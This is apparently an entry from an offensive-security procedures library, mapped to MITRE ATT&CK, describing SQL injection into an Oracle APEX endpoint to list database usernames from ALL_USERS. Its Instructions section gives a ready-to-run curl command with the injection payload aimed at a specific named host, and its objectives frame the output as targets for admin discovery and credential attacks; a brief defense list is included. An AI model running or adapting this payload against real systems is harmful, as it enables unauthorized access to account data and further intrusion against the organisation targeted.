---
tags:
  - sqli
  - user-enumeration
  - data-exfiltration
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/extract-usernames-payload]]'
verified: false
platforms:
  - Web
  - Oracle Database
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T03:46:25.745Z'
sub_techniques: []
id: 70b6fc58-af1f-4457-ba1c-e25113220d89
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Extract-Usernames-via-SQL-Injection

## Summary

This procedure uses SQL injection to execute a PL/SQL block querying the ALL_USERS view and printing usernames via OWA_UTIL.CELLSPRINT, allowing enumeration of database accounts for privilege assessment and lateral movement planning.

## Description

Building on the SQLi in /pls/apex/f, the payload selects USERNAME FROM ALL_USERS and outputs results directly. This reveals system and application users, potentially including privileged accounts, in Oracle Database 11g environments without authentication.

## Requirements

1. Established SQLi access
2. Tool for sending POST data with parameters (e.g., Burp)
3. Familiarity with Oracle system views

## Defense

Defensive measures and detection strategies:

- Limit access to system views like ALL_USERS in web apps
- Use least privilege for database users
- Audit queries for unauthorized SELECTs on user tables

## Objectives

1. Enumerate database usernames for targeting
2. Identify potential admin accounts
3. Support further exploitation like credential attacks

## Instructions

### Step 1: Send Username Extraction Payload

**Context**: Inject query for ALL_USERS and print results.

**Command** ([[commands/extract-usernames-payload]]):
```bash
curl "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS" -d ":1=SELECT USERNAME FROM ALL_USERS" -v
```

> Outputs a list of usernames from the ALL_USERS view in the response.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/extract-usernames-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- enumeration
- oracle
- plsql
